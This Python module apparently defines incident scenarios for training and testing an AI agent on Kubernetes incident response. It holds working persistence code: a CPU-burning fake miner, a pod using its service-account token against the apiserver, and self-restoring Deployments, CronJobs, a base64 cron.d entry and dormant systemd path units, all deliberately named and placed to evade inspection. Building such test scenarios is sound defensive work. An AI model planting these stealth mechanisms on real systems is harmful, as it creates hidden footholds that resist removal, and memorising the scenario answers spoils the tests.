"""Incident catalog. gym/faults shape; exec/network events Tetragon can see.

Named `incidents` so `import incidents` cannot collide with `gym/faults`
when both sit on sys.path (CHALLENGES #124).
"""

from __future__ import annotations

import base64
import json
import logging
import subprocess
import time
from pathlib import Path

log = logging.getLogger("k7d-mcp.incidents")

MINER_POD = "k7-incident-miner"
LATERAL_POD = "k7-incident-lateral"
BUSYBOX = "docker.io/library/busybox:1.36.1"
HYDRA_MINER = "web-cache"
HYDRA_EXPORTER = "metrics-exporter"
HYDRA_CRON = "metrics-sync"
HYDRA_SA = "metrics-exporter"
# Bland cron.d name — not a systemd unit, not a CronJob. Typical
# `systemctl list-units --type=service` / `kubectl get cronjob` miss it.
SLEEPER_CRON = "/etc/cron.d/raid-check"

# --- relay  ---------------------------------------------
# Layer 1 is the only thing a pre-fork inspect battery names. Layers 2/3
# are dormant systemd *path* units on the control-plane node, so
# `systemctl list-units --type=service --state=running`, `list-timers`,
# `/etc/cron.*` and `ps aux` are all blind to them — they spawn no
# process and are not services/timers/cron until an inotify edge fires
# them. The edge is the agent's OWN delete: removing the miner makes
# kubelet reap its pod dir under `/var/lib/kubelet/pods`, which the
# reconcile `.path` watches; removing the reconcile unit modifies
# `/etc/systemd/system`, which the integrity `.path` watches. Layer N+1
# is therefore not observable until layer N is actually destroyed.
RELAY_MINER = "node-agent"
RELAY_MINER_BIN = "nodecheck"
# The two tokens a `grep` on the inspect dump must NOT find before any
# delete. `test_faults.py` and `test_ubuntu_incident.rs` both assert this.
# Layer 2 (reseed): a dormant `.path` unit in the usual `/etc/systemd`
# dir. It is invisible to the battery (a `.path` unit is never a running
# service, timer, or cron entry) and named nothing like the miner, so
# the agent's own `find -name '*node-agent*'` cannot walk to it either.
# It is discovered only when layer 1 is deleted and the miner respawns.
RELAY_RESEED_UNIT = "kubelet-sync"
RELAY_RESEED_DIR = "/var/lib/kubelet-sync"
RELAY_RESEED_UNIT_DIR = "/etc/systemd/system"
# Layer 3 (guard): a dormant `.path` unit in the *vendor* unit dir,
# `start`ed but not `enable`d — so it leaves no file or `*.wants/`
# symlink under `/etc/systemd/system` and reading all of layer 2 (which
# never references it) gives no hint it exists. It watches layer 2's
# unit dir and only fires — becoming observable — once layer 2 is
# removed, reinstalling layer 2 from a stashed pristine copy.
RELAY_GUARD_UNIT = "systemd-unit-check"
RELAY_GUARD_DIR = "/usr/lib/systemd-unit-check"
RELAY_GUARD_UNIT_DIR = "/usr/lib/systemd/system"
# Neutral name for the stashed miner manifest — never `*node-agent*`.
RELAY_MANIFEST_NAME = "state.json"
RELAY_KUBELET_PODS = "/var/lib/kubelet/pods"
# Pin to the control-plane so the pod, its kubelet pod dir, and the
# node-local `k3s kubectl` reconcile all live on the same (server) node.
RELAY_NODE_SELECTOR = {"node-role.kubernetes.io/control-plane": "true"}
# The miner tolerates every taint, so cordoning/tainting the node keeps
# it Pending only until the reconcile re-applies it — a taint is not a
# fix. The only durable stop is removing the host reseed chain.
RELAY_TOLERATIONS = [{"operator": "Exists"}]

_RELAY_MINER_CMD = (
    f"cp /bin/busybox /tmp/{RELAY_MINER_BIN}; chmod +x /tmp/{RELAY_MINER_BIN}; "
    f"while true; do /tmp/{RELAY_MINER_BIN} sha256sum /tmp/{RELAY_MINER_BIN} "
    f">/dev/null 2>&1; sleep 0.02; done"
)


class UnknownIncident(ValueError):
    def __init__(self, incident_id: str, known: list[str]) -> None:
        self.incident_id = incident_id
        self.known = list(known)
        super().__init__(
            f"unknown incident {incident_id!r}; allowlist: {', '.join(self.known)}"
        )


def _kubectl(
    kube: Path, args: list[str], *, timeout: float = 45
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["kubectl", "--kubeconfig", str(kube), *args],
        check=False,
        capture_output=True,
        text=True,
        timeout=timeout,
    )


class Incident:
    id: str
    yaml: str
    pod: str
    marker: str

    def inject(self, kube: Path) -> None:
        r = subprocess.run(
            ["kubectl", "--kubeconfig", str(kube), "apply", "-f", "-"],
            input=self.yaml,
            check=False,
            capture_output=True,
            text=True,
        )
        if r.returncode != 0:
            raise RuntimeError(
                f"{self.id} apply failed: stderr={r.stderr!r} stdout={r.stdout!r}"
            )
        log.info("injected %s", self.id)

    def visible(self, kube: Path) -> bool:
        r = _kubectl(
            kube,
            [
                "-n",
                "default",
                "get",
                "pod",
                self.pod,
                "-o",
                "jsonpath={.status.phase}",
            ],
            timeout=20,
        )
        return r.returncode == 0 and (r.stdout or "").strip() in (
            "Running",
            "Pending",
            "Succeeded",
        )

    def remediate(self, kube: Path) -> None:
        r = _kubectl(
            kube,
            [
                "-n",
                "default",
                "delete",
                "pod",
                self.pod,
                "--ignore-not-found=true",
            ],
        )
        if r.returncode != 0:
            raise RuntimeError(f"{self.id} remediate failed: {r.stderr!r}")

    def remediate_members(self) -> list[int]:
        return [0]

    def remediate_cmd(self) -> str:
        return f"k3s kubectl -n default delete pod {self.pod} --ignore-not-found=true"


class CryptoMiner(Incident):
    """Busy-CPU pod that execs a binary named xmrig — Tetragon process_exec."""

    id = "cryptominer"
    pod = MINER_POD
    marker = "/tmp/xmrig"
    yaml = f"""apiVersion: v1
kind: Pod
metadata:
  name: {MINER_POD}
  namespace: default
  labels:
    app: k7-incident
    incident: cryptominer
spec:
  restartPolicy: Always
  containers:
  - name: miner
    image: {BUSYBOX}
    command:
    - sh
    - -c
    - |
      cp /bin/busybox /tmp/xmrig
      chmod +x /tmp/xmrig
      while true; do /tmp/xmrig sha256sum /dev/zero >/dev/null; done
"""


class LateralMovement(Incident):
    """Compromised pod curling the apiserver with its SA token."""

    id = "lateral"
    pod = LATERAL_POD
    marker = "kubernetes.default"
    yaml = f"""apiVersion: v1
kind: Pod
metadata:
  name: {LATERAL_POD}
  namespace: default
  labels:
    app: k7-incident
    incident: lateral
spec:
  restartPolicy: Always
  containers:
  - name: pivot
    image: {BUSYBOX}
    command:
    - sh
    - -c
    - |
      while true; do
        wget -qO- --no-check-certificate \\
          --header="Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\
          https://kubernetes.default.svc/api/v1/namespaces/default/pods || true
        sleep 2
      done
"""


def _deploy_json(
    *,
    name: str,
    namespace: str,
    labels: dict[str, str],
    container: str,
    command: str,
    service_account: str | None = None,
    node_selector: dict[str, str] | None = None,
    tolerations: list[dict] | None = None,
) -> str:
    spec: dict = {
        "containers": [
            {
                "name": container,
                "image": BUSYBOX,
                "command": ["sh", "-c", command],
            }
        ]
    }
    if service_account:
        spec["serviceAccountName"] = service_account
    if node_selector:
        spec["nodeSelector"] = node_selector
    if tolerations:
        spec["tolerations"] = tolerations
    return json.dumps(
        {
            "apiVersion": "apps/v1",
            "kind": "Deployment",
            "metadata": {"name": name, "namespace": namespace, "labels": labels},
            "spec": {
                "replicas": 1,
                "selector": {"matchLabels": labels},
                "template": {"metadata": {"labels": labels}, "spec": spec},
            },
        },
        separators=(",", ":"),
    )


def _ensure_deploy_sh(
    ns: str, name: str, body: str, *, loop_s: int | None, delim: str
) -> str:
    """Busybox wget: POST Deployment JSON on 404. loop_s=None runs once."""
    url = (
        f"https://kubernetes.default.svc/apis/apps/v1/namespaces/{ns}/deployments"
    )
    once = f"""TOK=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
H="Authorization: Bearer $TOK"
cat >/tmp/d.json <<'{delim}'
{body}
{delim}
if ! wget -qO /dev/null --no-check-certificate --header="$H" {url}/{name}; then
  wget -qO /dev/null --no-check-certificate --header="$H" \\
    --header="Content-Type: application/json" --post-file=/tmp/d.json \\
    {url} || true
fi"""
    if loop_s is None:
        return once
    return once + f"\nwhile true; do sleep {loop_s}; {once}\ndone"


_MINER_CMD = (
    "cp /bin/busybox /tmp/xmrig; chmod +x /tmp/xmrig; "
    "while true; do /tmp/xmrig sha256sum /dev/zero >/dev/null; done"
)
_MINER_JSON = _deploy_json(
    name=HYDRA_MINER,
    namespace="default",
    labels={"app": HYDRA_MINER},
    container="cache",
    command=_MINER_CMD,
)
_EXPORTER_SH = _ensure_deploy_sh(
    "default", HYDRA_MINER, _MINER_JSON, loop_s=12, delim="EOFMINER"
)
_EXPORTER_JSON = _deploy_json(
    name=HYDRA_EXPORTER,
    namespace="kube-system",
    labels={"app": HYDRA_EXPORTER},
    container="export",
    command=_EXPORTER_SH,
    service_account=HYDRA_SA,
)
_SYNC_SH = _ensure_deploy_sh(
    "kube-system", HYDRA_EXPORTER, _EXPORTER_JSON, loop_s=None, delim="EOFEXP"
)

_RELAY_DEPLOY_JSON = _deploy_json(
    name=RELAY_MINER,
    namespace="default",
    labels={"app": RELAY_MINER},
    container="agent",
    command=_RELAY_MINER_CMD,
    node_selector=RELAY_NODE_SELECTOR,
    tolerations=RELAY_TOLERATIONS,
)


def _yaml_block(script: str, indent: int) -> str:
    pad = " " * indent
    return "|\n" + "\n".join(pad + line for line in script.splitlines())


class Hydra(Incident):
    """Miner Deployment with two reseeds — a pod-delete is not a fix.

    Layer 1: Deployment default/web-cache (xmrig). Delete the pod and
    the ReplicaSet puts it back in seconds. Delete the Deployment and
    kube-system/metrics-exporter POST-creates it again every 12s.
    Delete that exporter and CronJob kube-system/metrics-sync brings
    the exporter back within a minute. Names are bland on purpose;
    the agent is not told this is a chain.
    """

    id = "hydra"
    pod = HYDRA_MINER
    marker = "/tmp/xmrig"
    yaml = f"""apiVersion: v1
kind: ServiceAccount
metadata:
  name: {HYDRA_SA}
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: {HYDRA_SA}
  namespace: default
rules:
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list", "create", "update", "patch", "delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: {HYDRA_SA}
  namespace: kube-system
rules:
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list", "create", "update", "patch", "delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: {HYDRA_SA}
  namespace: default
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: {HYDRA_SA}
subjects:
- kind: ServiceAccount
  name: {HYDRA_SA}
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: {HYDRA_SA}
  namespace: kube-system
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: {HYDRA_SA}
subjects:
- kind: ServiceAccount
  name: {HYDRA_SA}
  namespace: kube-system
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: {HYDRA_MINER}
  namespace: default
  labels:
    app: {HYDRA_MINER}
spec:
  replicas: 1
  selector:
    matchLabels:
      app: {HYDRA_MINER}
  template:
    metadata:
      labels:
        app: {HYDRA_MINER}
    spec:
      containers:
      - name: cache
        image: {BUSYBOX}
        command:
        - sh
        - -c
        - {_yaml_block(_MINER_CMD, 10)}
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: {HYDRA_EXPORTER}
  namespace: kube-system
  labels:
    app: {HYDRA_EXPORTER}
spec:
  replicas: 1
  selector:
    matchLabels:
      app: {HYDRA_EXPORTER}
  template:
    metadata:
      labels:
        app: {HYDRA_EXPORTER}
    spec:
      serviceAccountName: {HYDRA_SA}
      containers:
      - name: export
        image: {BUSYBOX}
        command:
        - sh
        - -c
        - {_yaml_block(_EXPORTER_SH, 10)}
---
apiVersion: batch/v1
kind: CronJob
metadata:
  name: {HYDRA_CRON}
  namespace: kube-system
spec:
  schedule: "* * * * *"
  concurrencyPolicy: Forbid
  successfulJobsHistoryLimit: 1
  failedJobsHistoryLimit: 1
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: {HYDRA_SA}
          restartPolicy: OnFailure
          containers:
          - name: sync
            image: {BUSYBOX}
            command:
            - sh
            - -c
            - {_yaml_block(_SYNC_SH, 14)}
"""

    def visible(self, kube: Path) -> bool:
        r = _kubectl(
            kube,
            [
                "-n",
                "default",
                "get",
                "pods",
                "-l",
                f"app={HYDRA_MINER}",
                "--field-selector=status.phase=Running",
                "--no-headers",
            ],
            timeout=20,
        )
        return r.returncode == 0 and bool((r.stdout or "").strip())

    def inject(self, kube: Path) -> None:
        super().inject(kube)
        deadline = time.monotonic() + 90
        while time.monotonic() < deadline:
            if self.visible(kube):
                return
            time.sleep(2)
        raise RuntimeError("hydra: web-cache never became Running")

    def remediate(self, kube: Path) -> None:
        r = _kubectl(
            kube,
            [
                "delete",
                "cronjob",
                HYDRA_CRON,
                "-n",
                "kube-system",
                "--ignore-not-found=true",
            ],
        )
        if r.returncode != 0:
            raise RuntimeError(f"{self.id} remediate cronjob: {r.stderr!r}")
        r = _kubectl(
            kube,
            [
                "delete",
                "deploy",
                HYDRA_EXPORTER,
                "-n",
                "kube-system",
                "--ignore-not-found=true",
            ],
        )
        if r.returncode != 0:
            raise RuntimeError(f"{self.id} remediate exporter: {r.stderr!r}")
        r = _kubectl(
            kube,
            [
                "delete",
                "deploy",
                HYDRA_MINER,
                "-n",
                "default",
                "--ignore-not-found=true",
            ],
        )
        if r.returncode != 0:
            raise RuntimeError(f"{self.id} remediate miner: {r.stderr!r}")

    def remediate_members(self) -> list[int]:
        return [0, 1, 2]

    def remediate_cmd(self) -> str:
        return (
            "systemctl disable --now cache-health.service || true; "
            "rm -f /etc/systemd/system/cache-health.service; "
            "rm -rf /var/lib/cache-health /usr/local/bin/cache-health.sh; "
            f"k3s kubectl delete cronjob {HYDRA_CRON} -n kube-system --ignore-not-found=true; "
            f"k3s kubectl delete deploy {HYDRA_EXPORTER} -n kube-system --ignore-not-found=true; "
            f"k3s kubectl delete deploy {HYDRA_MINER} -n default --ignore-not-found=true; "
            f"k3s kubectl delete sa,role,rolebinding {HYDRA_SA} -n kube-system --ignore-not-found=true; "
            f"k3s kubectl delete role,rolebinding {HYDRA_SA} -n default --ignore-not-found=true"
        )

    def plant_host(self, cids: list[int]) -> None:
        """Node-local reseed the apiserver cannot show.

        A nohup loop on every guest reapplies web-cache if missing.
        In-cluster delete of the CronJob/exporter/Deployment looks like
        a win until the soak — then the miner comes back. The agent has
        to exec onto the VMs; that is what grows the tree.
        """
        import agent as guest_agent

        manifest = (
            "apiVersion: apps/v1\n"
            "kind: Deployment\n"
            "metadata: {name: web-cache, namespace: default, labels: {app: web-cache}}\n"
            "spec:\n"
            "  replicas: 1\n"
            "  selector: {matchLabels: {app: web-cache}}\n"
            "  template:\n"
            "    metadata: {labels: {app: web-cache}}\n"
            "    spec:\n"
            "      containers:\n"
            "      - name: cache\n"
            f"        image: {BUSYBOX}\n"
            f"        command: [sh, -c, {_MINER_CMD!r}]\n"
        )
        script = (
            "mkdir -p /var/lib/cache-health; "
            "cat >/var/lib/cache-health/web-cache.yaml <<'EOFMAN'\n"
            f"{manifest}"
            "EOFMAN\n"
            "cat >/usr/local/bin/cache-health.sh <<'EOFSH'\n"
            "#!/bin/sh\n"
            "while true; do\n"
            "  k3s kubectl get deploy web-cache -n default >/dev/null 2>&1 || "
            "k3s kubectl apply -f /var/lib/cache-health/web-cache.yaml >/dev/null 2>&1\n"
            "  sleep 15\n"
            "done\n"
            "EOFSH\n"
            "chmod +x /usr/local/bin/cache-health.sh; "
            "cat >/etc/systemd/system/cache-health.service <<'EOFSVC'\n"
            "[Unit]\nDescription=cache health\n"
            "[Service]\nExecStart=/usr/local/bin/cache-health.sh\n"
            "Restart=always\n"
            "[Install]\nWantedBy=multi-user.target\n"
            "EOFSVC\n"
            "systemctl enable --now cache-health.service"
        )
        if not cids:
            raise RuntimeError("hydra.plant_host: no guest cids")
        for cid in cids:
            r = guest_agent.exec_cmd(cid, ["sh", "-c", script], timeout_s=40)
            if r["exit_code"] != 0:
                raise RuntimeError(
                    f"hydra.plant_host cid={cid}: {r}"
                )
        log.info("hydra host reseed planted on %s cids", len(cids))


_MINER_B64 = base64.b64encode(_MINER_JSON.encode()).decode()


class Sleeper(Hydra):
    """Visible hydra k8s layer, host persistence the first inspect misses.

    Same miner Deployment + metrics-exporter. No kube CronJob, no
    systemd unit. A /etc/cron.d entry reapplies the miner from a
    base64 blob — `kubectl get cronjob` and `systemctl list-units
    --type=service` do not show it. An agent that wipes only what
    the apiserver lists learns on the soak and has to deepen.
    """

    id = "sleeper"
    yaml = "\n---\n".join(
        doc for doc in Hydra.yaml.split("\n---\n") if "kind: CronJob" not in doc
    )

    def remediate_cmd(self) -> str:
        return (
            f"rm -f {SLEEPER_CRON}; "
            f"k3s kubectl delete deploy {HYDRA_EXPORTER} -n kube-system --ignore-not-found=true; "
            f"k3s kubectl delete deploy {HYDRA_MINER} -n default --ignore-not-found=true; "
            f"k3s kubectl delete sa,role,rolebinding {HYDRA_SA} -n kube-system --ignore-not-found=true; "
            f"k3s kubectl delete role,rolebinding {HYDRA_SA} -n default --ignore-not-found=true"
        )

    def plant_host(self, cids: list[int]) -> None:
        import agent as guest_agent

        # Cron file must not contain the miner name in plaintext or a
        # `grep -r web-cache /etc` on first inspect finds it.
        cron = (
            "SHELL=/bin/sh\n"
            "PATH=/usr/sbin:/usr/bin:/sbin:/bin\n"
            f"* * * * * root echo {_MINER_B64} | base64 -d | "
            "k3s kubectl apply -f - >/dev/null 2>&1\n"
        )
        if "web-cache" in cron or "xmrig" in cron:
            raise RuntimeError("sleeper cron leaked a miner token")
        script = (
            f"cat >{SLEEPER_CRON} <<'EOFCRON'\n"
            f"{cron}"
            "EOFCRON\n"
            f"chmod 644 {SLEEPER_CRON}; "
            "systemctl reload cron 2>/dev/null || "
            "systemctl reload crond 2>/dev/null || true"
        )
        if not cids:
            raise RuntimeError("sleeper.plant_host: no guest cids")
        for cid in cids:
            r = guest_agent.exec_cmd(cid, ["sh", "-c", script], timeout_s=20)
            if r["exit_code"] != 0:
                raise RuntimeError(f"sleeper.plant_host cid={cid}: {r}")
        log.info("sleeper host cron planted on %s cids", len(cids))


class Relay(Incident):
    """Depth-3 causal chain: each layer is revealed only when the one
    above it is deleted .

    Layer 1 (visible): Deployment ``default/node-agent`` — a busy-CPU
    miner pinned to the control-plane node. A pre-fork inspect battery
    names only this.

    Layer 2 (dormant): systemd ``kubelet-sync.path`` watching
    ``/var/lib/kubelet/pods``. Deleting the Deployment makes kubelet
    reap the pod dir, whose inotify edge fires ``kubelet-sync.service``,
    which re-applies the miner. A ``.path`` unit is ``active (waiting)``,
    never ``running``, never a timer, never cron, and spawns no process
    until fired — so ``systemctl list-units --type=service
    --state=running`` / ``list-timers`` / ``/etc/cron.*`` / ``ps aux``
    are all blind to it, and neither its unit nor its stashed manifest
    is named after the miner. It is discovered only once layer 1 is
    deleted and the miner respawns.

    Layer 3 (dormant): systemd ``systemd-unit-check.path`` living in the
    vendor unit dir ``/usr/lib/systemd/system`` and only ``start``ed
    (not ``enable``d), so it leaves nothing under ``/etc/systemd/system``
    or its ``*.wants/`` links. It watches ``/etc/systemd/system``;
    removing layer 2's unit files there fires ``systemd-unit-check``,
    which reinstalls layer 2 — so a fix that stops at layer 2 regrows on
    the soak. Layer 2 never references layer 3, so the guard is not
    observable until layer 2 is actually removed. Full remediation must
    peel layer 3, then layer 2, then the Deployment.
    """

    id = "relay"
    pod = RELAY_MINER
    marker = f"/tmp/{RELAY_MINER_BIN}"
    # Tokens the inspect dump must not contain before any delete. The
    # miner name (`node-agent`, `nodecheck`) is fair game — it is the
    # presenting symptom. The chain that resurrects it is not.
    next_layer_tokens = (RELAY_RESEED_UNIT, RELAY_GUARD_UNIT)
    yaml = f"""apiVersion: apps/v1
kind: Deployment
metadata:
  name: {RELAY_MINER}
  namespace: default
  labels:
    app: {RELAY_MINER}
spec:
  replicas: 1
  selector:
    matchLabels:
      app: {RELAY_MINER}
  template:
    metadata:
      labels:
        app: {RELAY_MINER}
    spec:
      nodeSelector:
        node-role.kubernetes.io/control-plane: "true"
      tolerations:
      - operator: Exists
      containers:
      - name: agent
        image: {BUSYBOX}
        command:
        - sh
        - -c
        - {_yaml_block(_RELAY_MINER_CMD, 10)}
"""

    def visible(self, kube: Path) -> bool:
        r = _kubectl(
            kube,
            [
                "-n",
                "default",
                "get",
                "pods",
                "-l",
                f"app={RELAY_MINER}",
                "--field-selector=status.phase=Running",
                "--no-headers",
            ],
            timeout=20,
        )
        return r.returncode == 0 and bool((r.stdout or "").strip())

    def inject(self, kube: Path) -> None:
        super().inject(kube)
        deadline = time.monotonic() + 120
        while time.monotonic() < deadline:
            if self.visible(kube):
                return
            time.sleep(2)
        raise RuntimeError("relay: node-agent never became Running")

    def remediate(self, kube: Path) -> None:
        r = _kubectl(
            kube,
            [
                "-n",
                "default",
                "delete",
                "deploy",
                RELAY_MINER,
                "--ignore-not-found=true",
            ],
        )
        if r.returncode != 0:
            raise RuntimeError(f"{self.id} remediate deploy: {r.stderr!r}")

    def remediate_members(self) -> list[int]:
        # Everything host-side lives on the control-plane node (member 0).
        return [0]

    def remediate_cmd(self) -> str:
        # Peel layer 3 first (so it cannot reinstall layer 2 when we
        # remove layer 2's files from the dir it watches), then layer 2,
        # then the Deployment last (so nothing resurrects it).
        return (
            f"systemctl stop {RELAY_GUARD_UNIT}.path 2>/dev/null || true; "
            f"systemctl stop {RELAY_GUARD_UNIT}.service 2>/dev/null || true; "
            f"rm -f {RELAY_GUARD_UNIT_DIR}/{RELAY_GUARD_UNIT}.path "
            f"{RELAY_GUARD_UNIT_DIR}/{RELAY_GUARD_UNIT}.service; "
            f"rm -rf {RELAY_GUARD_DIR}; "
            f"systemctl disable --now {RELAY_RESEED_UNIT}.path 2>/dev/null || true; "
            f"systemctl disable --now {RELAY_RESEED_UNIT}.service 2>/dev/null || true; "
            f"rm -f {RELAY_RESEED_UNIT_DIR}/{RELAY_RESEED_UNIT}.path "
            f"{RELAY_RESEED_UNIT_DIR}/{RELAY_RESEED_UNIT}.service; "
            f"rm -rf {RELAY_RESEED_DIR}; "
            "systemctl daemon-reload; "
            f"k3s kubectl delete deploy {RELAY_MINER} -n default --ignore-not-found=true"
        )

    def plant_script(self) -> str:
        """The self-contained shell that plants layers 2 and 3 on the
        control-plane node. Single source of truth: the inspect-battery
        Rust test fetches this verbatim and execs it (no reimplementation
        that could drift from the catalog).
        """
        manifest = _RELAY_DEPLOY_JSON
        if RELAY_RESEED_UNIT in manifest or RELAY_GUARD_UNIT in manifest:
            raise RuntimeError("relay manifest leaked a next-layer token")
        reseed_path_unit = f"{RELAY_RESEED_UNIT_DIR}/{RELAY_RESEED_UNIT}.path"
        reseed_svc_unit = f"{RELAY_RESEED_UNIT_DIR}/{RELAY_RESEED_UNIT}.service"
        guard_path_unit = f"{RELAY_GUARD_UNIT_DIR}/{RELAY_GUARD_UNIT}.path"
        guard_svc_unit = f"{RELAY_GUARD_UNIT_DIR}/{RELAY_GUARD_UNIT}.service"
        manifest_live = f"{RELAY_RESEED_DIR}/{RELAY_MANIFEST_NAME}"
        sync_live = f"{RELAY_RESEED_DIR}/sync.sh"
        # Layer 2 reconcile — continuously enforce the malicious desired
        # state: re-apply the miner manifest on every kubelet pod event.
        # This reverts *any* in-cluster tamper (delete, `scale
        # --replicas=0`, `patch` the command/resources to benign) within
        # one pod edge, so none of those is a fix — the only durable stop
        # is removing this host reseed chain. References only the miner,
        # never the guard, so reading all of layer 2 gives no hint layer 3
        # exists.
        reconcile_sh = (
            "#!/bin/sh\n"
            "export KUBECONFIG=/etc/rancher/k3s/k3s.yaml\n"
            f"k3s kubectl apply -f {manifest_live} >/dev/null 2>&1\n"
        )
        reconcile_path = (
            "[Unit]\nDescription=kubelet pod sync\n"
            "[Path]\n"
            f"PathModified={RELAY_KUBELET_PODS}\n"
            f"Unit={RELAY_RESEED_UNIT}.service\n"
            "[Install]\nWantedBy=multi-user.target\n"
        )
        reconcile_service = (
            "[Unit]\nDescription=kubelet pod sync\n"
            "[Service]\nType=oneshot\n"
            f"ExecStart={sync_live}\n"
        )
        # Layer 3 restore — reinstall layer 2 from the stash, but only if
        # it is actually missing, so a spurious edge on the watched dir is
        # a cheap no-op and can never loop.
        restore_sh = (
            "#!/bin/sh\n"
            f"if [ ! -f {reseed_path_unit} ]; then\n"
            f"  mkdir -p {RELAY_RESEED_DIR}\n"
            f"  cp {RELAY_GUARD_DIR}/sync.sh {sync_live}\n"
            f"  cp {RELAY_GUARD_DIR}/{RELAY_MANIFEST_NAME} {manifest_live}\n"
            f"  chmod +x {sync_live}\n"
            f"  cp {RELAY_GUARD_DIR}/{RELAY_RESEED_UNIT}.path {reseed_path_unit}\n"
            f"  cp {RELAY_GUARD_DIR}/{RELAY_RESEED_UNIT}.service {reseed_svc_unit}\n"
            "  systemctl daemon-reload\n"
            f"  systemctl start {RELAY_RESEED_UNIT}.path >/dev/null 2>&1\n"
            "fi\n"
        )
        # Guard watches layer 2's unit dir; no [Install] section — it is
        # started, never enabled, so it stays out of `/etc/systemd/system`.
        integrity_path = (
            "[Unit]\nDescription=systemd unit integrity check\n"
            "[Path]\n"
            f"PathModified={RELAY_RESEED_UNIT_DIR}\n"
            f"Unit={RELAY_GUARD_UNIT}.service\n"
        )
        integrity_service = (
            "[Unit]\nDescription=systemd unit integrity check\n"
            "[Service]\nType=oneshot\n"
            f"ExecStart={RELAY_GUARD_DIR}/restore.sh\n"
        )

        def heredoc(path: str, body: str, delim: str) -> str:
            return f"cat >{path} <<'{delim}'\n{body}{delim}\n"

        return (
            "set -e\n"
            f"mkdir -p {RELAY_RESEED_DIR} {RELAY_GUARD_DIR} "
            f"{RELAY_GUARD_UNIT_DIR} {RELAY_KUBELET_PODS}\n"
            # Layer 3 keeps the pristine copies it reinstalls layer 2 from.
            + heredoc(f"{RELAY_GUARD_DIR}/{RELAY_MANIFEST_NAME}", manifest + "\n", "EOFMAN")
            + heredoc(f"{RELAY_GUARD_DIR}/sync.sh", reconcile_sh, "EOFSYNC")
            + heredoc(f"{RELAY_GUARD_DIR}/{RELAY_RESEED_UNIT}.path", reconcile_path, "EOFRP")
            + heredoc(
                f"{RELAY_GUARD_DIR}/{RELAY_RESEED_UNIT}.service",
                reconcile_service,
                "EOFRS",
            )
            + heredoc(f"{RELAY_GUARD_DIR}/restore.sh", restore_sh, "EOFRESTORE")
            # Layer 2 live copies.
            + heredoc(manifest_live, manifest + "\n", "EOFMAN2")
            + heredoc(sync_live, reconcile_sh, "EOFSYNC2")
            + heredoc(reseed_path_unit, reconcile_path, "EOFRP2")
            + heredoc(reseed_svc_unit, reconcile_service, "EOFRS2")
            # Layer 3 live units (vendor dir; started-not-enabled below).
            + heredoc(guard_path_unit, integrity_path, "EOFIP")
            + heredoc(guard_svc_unit, integrity_service, "EOFIS")
            + f"chmod +x {sync_live} {RELAY_GUARD_DIR}/sync.sh "
            f"{RELAY_GUARD_DIR}/restore.sh\n"
            "systemctl daemon-reload\n"
            f"systemctl enable --now {RELAY_RESEED_UNIT}.path >/dev/null 2>&1\n"
            f"systemctl start {RELAY_GUARD_UNIT}.path >/dev/null 2>&1\n"
        )

    def plant_host(self, cids: list[int]) -> None:
        import agent as guest_agent

        if not cids:
            raise RuntimeError("relay.plant_host: no guest cids")
        # Control-plane is the server = the first adopted node.
        cid = cids[0]
        r = guest_agent.exec_cmd(cid, ["sh", "-c", self.plant_script()], timeout_s=40)
        if r["exit_code"] != 0:
            raise RuntimeError(f"relay.plant_host cid={cid}: {r}")
        log.info("relay layers 2/3 planted on control-plane cid=%s", cid)


_INSTANCES = (CryptoMiner(), LateralMovement(), Hydra(), Sleeper(), Relay())
CATALOG: dict[str, Incident] = {i.id: i for i in _INSTANCES}


def allowlist() -> list[str]:
    return sorted(CATALOG)


def get(incident_id: str) -> Incident:
    inc = CATALOG.get(incident_id)
    if inc is None:
        raise UnknownIncident(incident_id, allowlist())
    return inc


def pick(name: str | None) -> Incident:
    if name:
        return get(name)
    # the referenced work: the flagship incident whose deeper layers a
    # pre-fork inspect battery cannot name.
    return CATALOG["relay"]
